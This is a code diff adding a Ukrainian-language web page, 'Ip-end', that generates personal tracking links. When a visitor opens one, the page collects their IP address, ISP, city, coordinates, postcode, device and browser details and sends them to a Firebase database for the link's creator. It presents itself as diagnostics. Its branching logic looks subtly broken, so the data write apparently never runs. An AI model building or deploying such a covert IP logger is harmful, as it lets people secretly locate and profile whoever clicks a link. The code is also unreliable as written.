@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ip-end · Телеметричний збір даних</title>
+<style>
+  :root{
+    --bg: #0b1416;
+    --panel: #0f1c1f;
+    --line: #1e3236;
+    --text: #dce8e9;
+    --dim: #6f8b8e;
+    --accent: #4fd1c5;
+    --accent-dim: #245c56;
+    --warn: #e8a34a;
+    --mono: "JetBrains Mono", "SF Mono", Consolas, monospace;
+    --sans: "Inter", "Helvetica Neue", Arial, sans-serif;
+  }
+  *{box-sizing:border-box;}
+  html,body{
+    margin:0; padding:0; background:var(--bg); color:var(--text);
+    font-family:var(--sans);
+    min-height:100vh;
+  }
+  body{
+    background-image:
+      radial-gradient(circle at 15% 10%, rgba(79,209,197,0.06), transparent 40%),
+      radial-gradient(circle at 90% 80%, rgba(79,209,197,0.05), transparent 45%);
+  }
+  .wrap{
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 48px 24px 80px;
+  }
+  @media (max-width: 480px){
+    .wrap{ padding: 28px 16px 56px; }
+  }
+  .top{
+    display:flex;
+    justify-content:space-between;
+    align-items:baseline;
+    border-bottom:1px solid var(--line);
+    padding-bottom:18px;
+    margin-bottom:36px;
+  }
+  .top h1{
+    font-size:18px;
+    font-weight:600;
+    margin:0;
+    letter-spacing:0.3px;
+    color: var(--accent);
+  }
+  .top .clock{
+    font-family:var(--mono);
+    font-size:12.5px;
+    color:var(--dim);
+  }
+  .generator-box{
+    background: var(--panel);
+    border: 1px solid var(--accent-dim);
+    padding: 20px;
+    margin-bottom: 34px;
+    text-align: center;
+    border-radius: 4px;
+  }
+  .generator-box h3{ margin: 0 0 10px 0; font-size: 15px; color: var(--text); }
+  .btn{
+    background: var(--accent);
+    color: var(--bg);
+    border: none;
+    padding: 10px 20px;
+    font-family: var(--mono);
+    font-weight: 600;
+    cursor: pointer;
+    border-radius: 2px;
+    font-size: 13px;
+    transition: opacity 0.2s;
+  }
+  .btn:hover{ opacity: 0.85; }
+  .gen-result{
+    margin-top: 12px;
+    font-family: var(--mono);
+    font-size: 12px;
+    word-break: break-all;
+    color: var(--accent);
+  }
+  .hero{
+    text-align:center;
+    padding: 30px 20px 42px;
+    border-bottom:1px solid var(--line);
+    margin-bottom: 8px;
+  }
+  .hero .label{
+    font-size:13px;
+    color:var(--dim);
+    margin-bottom:10px;
+  }
+  .hero .ip{
+    font-family:var(--mono);
+    font-size:clamp(24px, 7vw, 46px);
+    font-weight:600;
+    color:var(--accent);
+    letter-spacing:0.3px;
+    overflow-wrap:break-word;
+  }
+  .hero .loc{
+    margin-top:10px;
+    font-size:15px;
+    color:var(--text);
+  }
+  .hero .loc span{color:var(--dim);}
+  .section{
+    margin-top:34px;
+  }
+  .section-title{
+    font-size:12.5px;
+    color:var(--dim);
+    margin-bottom:12px;
+    padding-bottom:8px;
+    border-bottom:1px solid var(--line);
+  }
+  .rows{
+    display:grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1px;
+    background:var(--line);
+    border:1px solid var(--line);
+  }
+  @media (max-width: 600px){
+    .rows{grid-template-columns: 1fr;}
+  }
+  .row{
+    background:var(--panel);
+    padding:13px 16px;
+    display:flex;
+    flex-direction:column;
+    gap:4px;
+    min-height:56px;
+    justify-content:center;
+  }
+  .row.full{
+    grid-column: 1 / -1;
+  }
+  .row .k{
+    font-size:11.5px;
+    color:var(--dim);
+  }
+  .row .v{
+    font-family:var(--mono);
+    font-size:13px;
+    color:var(--text);
+    word-break:break-all;
+  }
+  .row .v.accent{color:var(--accent);}
+  .row .v.warn{color:var(--warn);}
+  .note{
+    margin-top:40px;
+    font-size:12.5px;
+    color:var(--dim);
+    line-height:1.6;
+    border-left:2px solid var(--accent-dim);
+    padding-left:14px;
+  }
+  .skeleton{
+    display:inline-block;
+    width:140px;
+    height:14px;
+    background:linear-gradient(90deg, var(--line) 25%, #2a4448 50%, var(--line) 75%);
+    background-size:200% 100%;
+    animation:shimmer 1.3s infinite;
+    border-radius:2px;
+    vertical-align:middle;
+  }
+  @keyframes shimmer{
+    0%{background-position:200% 0;}
+    100%{background-position:-200% 0;}
+  }
+</style>
+
+<!-- Підключаємо Firebase через стабільні CDN скрипти (працюють навіть локально) -->
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="top">
+    <h1>Ip-end · Діагностика</h1>
+    <div class="clock" id="clock">—</div>
+  </div>
+
+  <!-- Блок створення посилання -->
+  <div class="generator-box" id="genBox">
+    <h3>Створити персональне посилання</h3>
+    <button class="btn" id="genBtn">Згенерувати лінк</button>
+    <div class="gen-result" id="genResult"></div>
+  </div>
+
+  <div class="hero">
+    <div class="label" id="heroLabel">Визначена IP-адреса та геопозиція</div>
+    <div class="ip" id="heroIp"><span class="skeleton" style="width:200px;height:36px;"></span></div>
+    <div class="loc" id="heroLoc">визначення через зовнішні API…</div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Мережа та Геолокація</div>
+    <div class="rows">
+      <div class="row"><div class="k">Провайдер / ASN (ISP)</div><div class="v accent" id="isp"><span class="skeleton"></span></div></div>
+      <div class="row"><div class="k">Країна та код</div><div class="v" id="country"><span class="skeleton"></span></div></div>
+      <div class="row"><div class="k">Місто / Регіон</div><div class="v" id="city"><span class="skeleton"></span></div></div>
+      <div class="row"><div class="k">Координати</div><div class="v" id="coords"><span class="skeleton"></span></div></div>
+      <div class="row"><div class="k">Поштовий індекс</div><div class="v" id="zip">—</div></div>
+      <div class="row"><div class="k">Онлайн-статус</div><div class="v" id="online">—</div></div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Браузер та Локалізація</div>
+    <div class="rows">
+      <div class="row"><div class="k">Мова (Language)</div><div class="v" id="lang">—</div></div>
+      <div class="row"><div class="k">Часовий пояс</div><div class="v" id="tz">—</div></div>
+      <div class="row"><div class="k">Тип мережі (API)</div><div class="v" id="netType">—</div></div>
+      <div class="row"><div class="k">Швидкість з'єднання</div><div class="v" id="netSpeed">—</div></div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Апаратні ресурси</div>
+    <div class="rows">
+      <div class="row"><div class="k">Платформа / ОС</div><div class="v" id="platform">—</div></div>
+      <div class="row"><div class="k">Ядра CPU</div><div class="v" id="cores">—</div></div>
+      <div class="row"><div class="k">Оперативна пам'ять (RAM)</div><div class="v" id="ram">—</div></div>
+      <div class="row"><div class="k">Графічний чип (GPU)</div><div class="v" id="gpu">—</div></div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Безпека та система</div>
+    <div class="rows">
+      <div class="row"><div class="k">Виявлення бота (webdriver)</div><div class="v" id="webdriver">—</div></div>
+      <div class="row full"><div class="k">User-Agent</div><div class="v" id="ua">—</div></div>
+    </div>
+  </div>
+
+  <div class="note">
+    Система Ip-end виконує збір технічних параметрів середовища через стандартні інтерфейси браузера.
+  </div>
+
+</div>
+
+<script>
+  // Конфіг твого Firebase
+  const firebaseConfig = {
+    apiKey: "AIzaSyAJlMZuzlxdL9Y2z2nmbWVEDN-SIQ7AwSc",
+    authDomain: "ip-end.firebaseapp.com",
+    databaseURL: "https://ip-end-default-rtdb.europe-west1.firebasedatabase.app",
+    projectId: "ip-end",
+    storageBucket: "ip-end.firebasestorage.app",
+    messagingSenderId: "503250688000",
+    appId: "1:503250688000:web:37e44bb2b990447c69e0e5",
+    measurementId: "G-PX4C45YZ93"
+  };
+
+  // Ініціалізація
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+
+  // Годинник
+  setInterval(() => {
+    const el = document.getElementById('clock');
+    if(el) el.textContent = new Date().toLocaleTimeString('uk-UA');
+  }, 1000);
+
+  const urlParams = new URLSearchParams(window.location.search);
+  const targetId = urlParams.get('id');
+
+  function displayData(d) {
+    document.getElementById('heroIp').textContent = d.ip || '—';
+    document.getElementById('heroLoc').innerHTML = (d.city || '—') + ', ' + (d.country || '—');
+    document.getElementById('isp').textContent = d.isp || '—';
+    document.getElementById('country').textContent = d.country || '—';
+    document.getElementById('city').textContent = d.city || '—';
+    document.getElementById('coords').textContent = d.coords || '—';
+    document.getElementById('zip').textContent = d.zip || '—';
+    document.getElementById('online').textContent = d.online || 'Online';
+    document.getElementById('lang').textContent = d.language || '—';
+    document.getElementById('tz').textContent = d.tz || '—';
+    document.getElementById('netType').textContent = d.netType || '—';
+    document.getElementById('netSpeed').textContent = d.netSpeed || '—';
+    document.getElementById('platform').textContent = d.platform || '—';
+    document.getElementById('cores').textContent = d.cores || '—';
+    document.getElementById('ram').textContent = d.ram || '—';
+    document.getElementById('webdriver').textContent = d.webdriver || '—';
+    document.getElementById('ua').textContent = d.ua || '—';
+  }
+
+  async function run() {
+    if (targetId) {
+      // Режим перегляду звіту за ID
+      document.getElementById('genBox').style.display = 'none';
+      document.getElementById('heroLabel').textContent = 'Звіт за посиланням (ID: ' + targetId + ')';
+      document.getElementById('heroLoc').textContent = 'Очікування даних від кліка...';
+
+      db.ref('logs/' + targetId).on('value', (snapshot) => {
+        const val = snapshot.val();
+        if (val && val.ip && val.ip !== 'збирається...') {
+          displayData(val);
+        } else if (val && val.status) {
+          document.getElementById('heroLoc').textContent = val.status;
+        }
+      });
+
+    } else {
+      // Режим збору даних (коли хтось відкрив лінк)
+      const data = {
+        ua: navigator.userAgent,
+        platform: navigator.platform || 'невідомо',
+        language: navigator.language || '—',
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone || '—',
+        cores: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' ядер' : '—',
+        ram: navigator.deviceMemory ? '~' + navigator.deviceMemory + ' GB' : '—',
+        online: navigator.onLine ? 'Online' : 'Offline',
+        webdriver: navigator.webdriver ? 'ТАК (Бот)' : 'Ні (Людина)',
+        time: new Date().toISOString(),
+        ip: 'збирається...'
+      };
+
+      const conn = navigator.connection || navigator.mozConnection;
+      if(conn) {
+        data.netType = conn.effectiveType ? conn.effectiveType.toUpperCase() : '—';
+        data.netSpeed = `${conn.downlink || '?'} Mbps`;
+      } else {
+        data.netType = '—';
+        data.netSpeed = '—';
+      }
+
+      try {
+        const r = await fetch('https://ipapi.co/json/');
+        if(r.ok) {
+          const d = await r.json();
+          data.ip = d.ip || '—';
+          data.isp = d.org || '—';
+          data.country = d.country_name || '—';
+          data.city = d.city || '—';
+          data.coords = (d.latitude && d.longitude) ? `${d.latitude}, ${d.longitude}` : '—';
+          data.zip = d.postal || '—';
+        }
+      } catch(e) {
+        try {
+          const r2 = await fetch('https://api.ipify.org?format=json');
+          const d2 = await r2.json();
+          data.ip = d2.ip;
+        } catch(err) {
+          data.ip = 'Не вдалося визначити';
+        }
+      }
+
+      displayData(data);
+
+      const activeId = new URLSearchParams(window.location.search).get('id');
+      if (activeId) {
+        db.ref('logs/' + activeId).set(data)
+          .then(() => console.log('Дані успішно полетіли у Firebase!'))
+          .catch(err => console.error('Помилка запису:', err));
+      }
+    }
+  }
+
+  run();
+
+  // Кнопка генерації
+  document.getElementById('genBtn').addEventListener('click', () => {
+    const randomId = Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 8);
+    
+    db.ref('logs/' + randomId).set({ status: 'Очікування переходу...' });
+
+    // Якщо ти ще не підключив Гітхаб, беремо поточний шлях або базовий рядок
+    const currentUrl = window.location.protocol === 'file:' 
+      ? 'https://simdomyt.github.io/ip-end/' // залиш свою ссилку коли закинеш на гітхаб
+      : window.location.origin + window.location.pathname;
+
+    const uniqueLink = `${currentUrl}?id=${randomId}`;
+    
+    document.getElementById('genResult').innerHTML = `Твоє посилання:<br><a href="${uniqueLink}" target="_blank" style="color: var(--accent);">${uniqueLink}</a>`;
+  });
+</script>
+</body>
+</html>
